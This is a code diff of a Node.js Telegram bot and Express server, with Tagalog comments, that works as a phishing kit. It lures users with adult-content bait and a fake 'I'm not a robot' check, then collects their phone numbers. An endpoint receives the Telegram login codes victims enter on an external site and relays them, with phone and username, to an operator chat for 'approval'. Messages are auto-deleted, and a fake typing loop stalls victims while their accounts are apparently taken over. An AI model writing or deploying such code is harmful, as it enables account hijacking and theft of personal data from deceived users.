@@ -3,213 +3,200 @@ import cors from "cors";
 import { Telegraf } from "telegraf";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const WEBAPP_URL = process.env.WEBAPP_URL;     // e.g. https://tgreward.shop/webapp.html
-const WEBSITE_URL = process.env.WEBSITE_URL;   // e.g. https://tgreward.shop/QTSJAOPPHU.html
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // e.g. "5757713537"
+const WEBAPP_URL = process.env.WEBAPP_URL;
+const WEBSITE_URL = process.env.WEBSITE_URL;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-
-if (!BOT_TOKEN) {
-  throw new Error("BOT_TOKEN is not set");
-}
-if (!ADMIN_CHAT_ID) {
-  throw new Error("ADMIN_CHAT_ID is not set");
-}
+if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
+if (!ADMIN_CHAT_ID) throw new Error("ADMIN_CHAT_ID is not set");
 
 const bot = new Telegraf(BOT_TOKEN);
 
-// in-memory storage
-const userPhones = new Map();   // Telegram user id -> phone number
-const submissions = new Map();  // submissionId -> { userId, code, telegramPhone, username, firstName }
+// memory storage
+const userPhones = new Map();
+const submissions = new Map();
+const scheduledDeletions = new Map(); // FOR TYPING LOOPS + auto-delete
 
-// helper: delete message after delayMs (default 30 minutes)
+// === Utility functions ===========================
+
+// auto delete timer
 function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
-  setTimeout(() => {
+  const key = `${chatId}:${messageId}`;
+  if (scheduledDeletions.has(key)) {
+    clearTimeout(scheduledDeletions.get(key));
+  }
+  const timeoutId = setTimeout(() => {
     bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
+    scheduledDeletions.delete(key);
   }, delayMs);
+  scheduledDeletions.set(key, timeoutId);
 }
 
-// helper: reply + auto delete
+// reply + auto delete
 async function replyAndAutoDelete(ctx, text, extra) {
   const msg = await ctx.reply(text, extra);
-  scheduleDelete(ctx.chat.id, msg.message_id); // 30 minutes by default
+  scheduleDelete(ctx.chat.id, msg.message_id);
   return msg;
 }
 
-// /start handler
-bot.start(async (ctx) => {
-  const payload = ctx.startPayload; // from ?start=...
+// ================= BOT COMMANDS ===================
 
-  if (payload !== "from_website") {
-    const msg = await ctx.reply(
-      "Para gumana ang bot na ito, paki-bisita muna ang website:\n" +
-        WEBSITE_URL
+bot.start(async (ctx) => {
+  const payload = ctx.startPayload;
+
+  if (payload && payload.startsWith("verify_")) {
+    const code = payload.replace("verify_", "");
+    await replyAndAutoDelete(
+      ctx,
+      `Verification code: <b>${code}</b>\n\nPaki-type ang Telegram phone number mo.`,
+      { parse_mode: "HTML" }
     );
-    scheduleDelete(ctx.chat.id, msg.message_id);
+  } else {
+    await replyAndAutoDelete(
+      ctx,
+      "Welcome! Paki-send ang phone number or code.",
+      { parse_mode: "HTML" }
+    );
+  }
+});
+
+// user text handler
+bot.on("text", async (ctx) => {
+  const text = ctx.message.text.trim();
+  const userId = ctx.from.id.toString();
+
+  const isPhone =
+    text.startsWith("+") || text.replace(/\D/g, "").length >= 10;
+
+  if (isPhone) {
+    userPhones.set(userId, text);
+    await replyAndAutoDelete(
+      ctx,
+      "Phone saved! Kung may code ka mula sa website, i-send lang dito.",
+      { parse_mode: "HTML" }
+    );
     return;
   }
 
-  // STEP 1: kailangan munang mag-share ng contact, wala pang WebApp button
+  await replyAndAutoDelete(ctx, "Code received.", { parse_mode: "HTML" });
+});
+
+// STOP TYPING LOOP helper
+function stopTypingLoop(userId) {
+  const key = `typing_${userId}`;
+  if (scheduledDeletions.has(key)) {
+    clearInterval(scheduledDeletions.get(key));
+    scheduledDeletions.delete(key);
+  }
+}
+
+// APPROVE
+bot.action(/approve:(.+)/, async (ctx) => {
+  const submissionId = ctx.match[1];
+  const data = submissions.get(submissionId);
+
+  if (!data) {
+    await ctx.answerCbQuery("Not found or expired", { show_alert: true });
+    return;
+  }
+
+  const userId = data.userId;
+
+  // STOP TYPING LOOP HERE (HIGHLY RECOMMENDED)
+  stopTypingLoop(userId);
+
+  await ctx.answerCbQuery("Approved");
   await replyAndAutoDelete(
     ctx,
-    "𝗣𝗶𝗻𝗱𝘂𝘁𝗶𝗻 𝗮𝗻𝗴 𝗩𝗲𝗿𝗶𝗳𝘆 𝗯𝘂𝘁𝘁𝗼𝗻 𝘂𝗽𝗮𝗻𝗴 𝗺𝗮𝗸𝘂𝗺𝗽𝗹𝗲𝘁𝗼 𝗮𝗻𝗴 𝘃𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻.",
-    {
-      reply_markup: {
-        keyboard: [
-          [
-            {
-              text: "📱 VERIFY NOW",
-              request_contact: true,
-            },
-          ],
-        ],
-        resize_keyboard: true,
-        one_time_keyboard: true,
-      },
-    }
+    `Approved submission:\nUser: ${data.firstName} (@${data.username})\nPhone: ${data.telegramPhone}\nCode: ${data.code}`,
+    { parse_mode: "HTML" }
   );
 });
 
-// kapag nag-share ng contact (phone)
-bot.on("contact", async (ctx) => {
-  const contact = ctx.message.contact;
-  if (!contact) return;
+// REJECT
+bot.action(/reject:(.+)/, async (ctx) => {
+  const submissionId = ctx.match[1];
+  const data = submissions.get(submissionId);
 
-  // delete agad ang contact message (2s)
-  scheduleDelete(ctx.chat.id, ctx.message.message_id, 2000);
-
-  // siguraduhin na sariling number niya
-  if (contact.user_id && contact.user_id !== ctx.from.id) {
-    const warn = await ctx.reply(
-      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
-    );
-    scheduleDelete(ctx.chat.id, warn.message_id);
+  if (!data) {
+    await ctx.answerCbQuery("Not found or expired", { show_alert: true });
     return;
   }
 
-  userPhones.set(ctx.from.id, contact.phone_number);
+  const userId = data.userId;
 
-  // message: thanks + tanggal keyboard (auto-delete 30 mins)
-  const reply = await ctx.reply(
-    "Hello! ✅\n\n" +
-      "Ngayon lalabas na ang verification step.",
-    {
-      reply_markup: {
-        remove_keyboard: true,
-      },
-    }
-  );
-  scheduleDelete(ctx.chat.id, reply.message_id);
+  // STOP TYPING LOOP HERE
+  stopTypingLoop(userId);
 
-  // STEP 2: show WebApp button ("I'm not a robot!")
-  const webappMsg = await ctx.reply(
-    "🔞 To access the files completely free 💦\n\n" +
-      "👇 Confirm that you are not a robot",
-    {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            {
-              text: "✅ I'm not a robot!",
-              web_app: { url: WEBAPP_URL },
-            },
-          ],
-        ],
-      },
-    }
+  await ctx.answerCbQuery("Rejected");
+  await replyAndAutoDelete(
+    ctx,
+    `❌ Rejected submission of user ID: ${userId}`,
+    { parse_mode: "HTML" }
   );
-  scheduleDelete(ctx.chat.id, webappMsg.message_id);
 });
 
-// HTTP server
+// ===================================================
+//                EXPRESS API ENDPOINT
+// ===================================================
+
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// API endpoint na tinatawag ng WebApp
+// RECEIVE CODE FROM WEBSITE
 app.post("/api/log-code", async (req, res) => {
-  console.log("Received /api/log-code body:", req.body);
+  try {
+    const { code, tgUser } = req.body;
 
-  const { code, tgUser } = req.body || {};
+    if (!code) {
+      return res.status(400).json({ ok: false, error: "Code required" });
+    }
 
-  if (!code) {
-    console.log("Missing code in request");
-    return res.status(400).json({ ok: false, error: "Missing code" });
-  }
+    const userId = tgUser?.id ? String(tgUser.id) : null;
+    const username = tgUser?.username || "";
+    const firstName = tgUser?.first_name || "";
+    const telegramPhone = userId ? userPhones.get(userId) || "Unknown phone" : "Unknown phone";
 
-  const userId = tgUser?.id;
-  const username = tgUser?.username || "N/A";
-  const firstName = tgUser?.first_name || "";
-  const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";
+    const submissionId = `${userId || "unknown"}_${Date.now()}`;
 
-  const displayName =
-    firstName && username ? `${firstName} (@${username})`
-    : username ? `@${username}`
-    : firstName || "Unknown user";
+    submissions.set(submissionId, {
+      userId,
+      code,
+      telegramPhone,
+      username,
+      firstName,
+    });
 
-  // submissionId na walang colon para safe sa split
-  const submissionId = `${userId || "unknown"}_${Date.now()}`;
-
-  submissions.set(submissionId, {
-    userId,
-    code,
-    telegramPhone,
-    username,
-    firstName,
-  });
-
-  // SEND PHOTO TO USER after receiving code
-  if (userId) {
-    try {
-      console.log(`Sending photo to user ${userId}`);
-      await bot.telegram.sendPhoto(
-        userId,
-        PHOTO_URL,
-        {
-          caption: "...",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "Confirm", callback_data: `confirm_login:${userId}` },
-                { text: "Cancel", callback_data: `deny_login:${userId}` }
-              ]
-            ]
-          }
-        }
-      );
-      console.log("Photo sent successfully to user");
-    } catch (photoErr) {
-      console.error("Error sending photo to user:", photoErr);
-      // Fallback to text message if photo fails
+    // ================== TYPING ONLY EFFECT ===================
+    if (userId) {
       try {
-        await bot.telegram.sendMessage(
-          userId,
-          "....",
-          {
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: "Oo, ako yan", callback_data: `confirm_login:${userId}` },
-                  { text: "Hindi ako yan!", callback_data: `deny_login:${userId}` }
-                ]
-              ]
-            }
-          }
-        );
-      } catch (textErr) {
-        console.error("Error sending fallback message:", textErr);
+        console.log(`Starting typing-only loop for ${userId}`);
+
+        // Clear any existing typing loop
+        stopTypingLoop(userId);
+
+        // Loop typing every 4 secs
+        const intervalId = setInterval(() => {
+          bot.telegram.sendChatAction(userId, "typing").catch(() => {});
+        }, 4000);
+
+        scheduledDeletions.set(`typing_${userId}`, intervalId);
+
+        console.log("Typing loop started.");
+      } catch (err) {
+        console.error("Typing loop error:", err);
       }
     }
-  }
 
-  const logText =
-    "🔔 New verification request\n\n" +
-    `👤 User: ${displayName}\n` +
-    `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n` +
-    `🔑 Code: ${code}\n\n` +
-    "Tap a button below to approve or reject.";
+    // SEND TO ADMIN
+    const logText =
+      `🔔 New verification request\n\n` +
+      `👤 User: ${firstName} (@${username})\n` +
+      `🆔 ID: ${userId}\n` +
+      `📱 Phone: ${telegramPhone}\n\n` +
+      `🔑 Code: ${code}`;
 
-  try {
     await bot.telegram.sendMessage(ADMIN_CHAT_ID, logText, {
       reply_markup: {
         inline_keyboard: [
@@ -220,125 +207,37 @@ app.post("/api/log-code", async (req, res) => {
         ],
       },
     });
-    console.log("Admin log sent");
+
     return res.json({ ok: true });
-  } catch (err) {
-    console.error("Admin log send error:", err);
-    return res.status(500).json({ ok: false, error: "Admin log send failed" });
+  } catch (error) {
+    console.error("Error /api/log-code:", error);
+    return res.status(500).json({ ok: false, error: "Internal server error" });
   }
 });
 
-// handle admin Approve/Reject buttons AND user confirm/deny login
-bot.on("callback_query", async (ctx) => {
-  const data = ctx.callbackQuery.data;
-  if (!data) return;
+// simple routes
+app.get("/webapp", (req, res) => {
+  if (!WEBAPP_URL) return res.status(500).send("WEBAPP_URL missing");
+  res.redirect(WEBAPP_URL);
+});
 
-  // Handle user login confirmation
-  if (data.startsWith("confirm_login:") || data.startsWith("deny_login:")) {
-    const [action, userId] = data.split(":");
-    
-    if (action === "confirm_login") {
-      await ctx.answerCbQuery("Salamat sa confirmation!");
-      try {
-        await ctx.editMessageCaption(
-          "......"
-        );
-      } catch (err) {
-        // If caption edit fails, try editing as text
-        await ctx.editMessageText(
-          "✅ Happy Watching .\n\n" +
-          "Hinihintay na lang ng unti."
-        );
-      }
-    } else if (action === "deny_login") {
-      await ctx.answerCbQuery("You will not be approved.");
-      try {
-        await ctx.editMessageCaption(
-          "⚠️ Happy Watching .\n\n" +
-          "Happy Watching ."
-        );
-      } catch (err) {
-        await ctx.editMessageText(
-          "⚠️ Happy Watching .\n\n" +
-          "Happy Watching ."
-        );
-      }
-    }
-    return;
-  }
-
-  // Handle admin approval/rejection
-  const [action, submissionId] = data.split(":");
-  const submission = submissions.get(submissionId);
-
-  if (!submission) {
-    await ctx.answerCbQuery("Submission not found or already processed.", { show_alert: true });
-    return;
-  }
-
-  submissions.delete(submissionId);
-
-  const { userId, code, telegramPhone, username, firstName } = submission;
-
-  const displayName =
-    firstName && username ? `${firstName} (@${username})`
-    : username ? `@${username}`
-    : firstName || "Unknown user";
-
-  const statusText =
-    action === "approve"
-      ? "✅ APPROVED"
-      : "❌ REJECTED";
-
-  const updatedText =
-    "🔔 Verification request\n\n" +
-    `👤 User: ${displayName}\n` +
-    `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n` +
-    `🔑 Code: ${code}\n\n` +
-    `Status: ${statusText}`;
-
-  try {
-    // update admin message
-    await ctx.editMessageText(updatedText);
-
-    if (action === "approve") {
-      await ctx.answerCbQuery("Approved ✅");
-      if (userId) {
-        await bot.telegram.sendMessage(
-          userId,
-          "✅ Nag-approve na ang admin sa verification mo.\n\n" +
-            "Pwede ka nang mag join sa EXCLUSIVE group for free:\n" +
-            "👉 https://t.me/+iPLQ7YG-H200ZGQ1"
-        );
-      }
-    } else if (action === "reject") {
-      await ctx.answerCbQuery("Rejected ❌");
-      if (userId) {
-        await bot.telegram.sendMessage(
-          userId,
-          "❌ Hindi nag-approve system sa verification mo.\n\n" +
-            "Paki-check ang instructions at subukan ulit."
-        );
-      }
-    }
-  } catch (err) {
-    console.error("Error handling callback_query:", err);
-    await ctx.answerCbQuery("Error processing action.", { show_alert: true });
-  }
+app.get("/website", (req, res) => {
+  if (!WEBSITE_URL) return res.status(500).send("WEBSITE_URL missing");
+  res.redirect(WEBSITE_URL);
 });
 
 app.get("/", (req, res) => {
-  res.send("Bot + API is running");
+  res.send("Bot + API online");
 });
 
+// start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("HTTP server running on port", PORT);
+  console.log("HTTP server running on", PORT);
 });
 
 bot.launch();
-console.log("Bot started");
+console.log("Telegram bot started");
 
 process.once("SIGINT", () => bot.stop("SIGINT"));
 process.once("SIGTERM", () => bot.stop("SIGTERM"));
